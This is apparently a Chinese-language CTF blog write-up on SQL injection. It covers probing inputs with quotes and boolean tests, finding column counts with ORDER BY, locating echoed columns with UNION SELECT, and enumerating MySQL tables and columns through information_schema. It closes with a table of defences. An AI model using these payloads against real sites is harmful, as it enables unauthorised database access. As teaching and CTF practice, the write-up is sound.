---
title: CTF Web复盘：SQL注入从异常回显到稳定利用
date: 2026-07-04 20:25:00
categories:
  - CTF
tags:
  - Web
  - SQLi
  - payload
  - security
---
SQL 注入的本质，是用户输入被拼接进查询语义，导致数据和指令边界坍塌。CTF 中我们追求拿 flag，但复盘时更重要的是理解漏洞如何出现、如何验证、如何修复。

## 观测异常

常见入口包括登录框、搜索框、文章 ID、排序参数和 Cookie。第一步不是直接上大 payload，而是做最小扰动：

```text
1'
1"
1 and 1=1
1 and 1=2
```

如果页面出现数据库错误、结果数量变化或响应时间异常，就说明输入可能影响了查询结构。

## 判断列数与回显位

```text
?id=1 order by 1
?id=1 order by 2
?id=-1 union select 1,2,3
```

当 `order by n` 报错时，列数通常小于 `n`。`union select` 的可见数字位置就是回显位。

## 信息枚举路径

以 MySQL 为例：

```sql
database()
version()
group_concat(table_name) from information_schema.tables where table_schema=database()
group_concat(column_name) from information_schema.columns where table_name='flag'
```

## 防御视角

| 风险点 | 防御方式 |
| --- | --- |
| 字符串拼接 SQL | 使用参数化查询或 ORM 绑定变量 |
| 错误信息暴露 | 生产环境关闭详细数据库错误 |
| 权限过大 | 数据库账户最小权限 |
| 输入无约束 | 类型校验、白名单、长度限制 |

一次好的 CTF 复盘，不只是保存 payload，而是写清楚“为什么这个输入改变了查询语义”。这样下一次遇到过滤、盲注或二次注入时，我们仍然能从原理出发。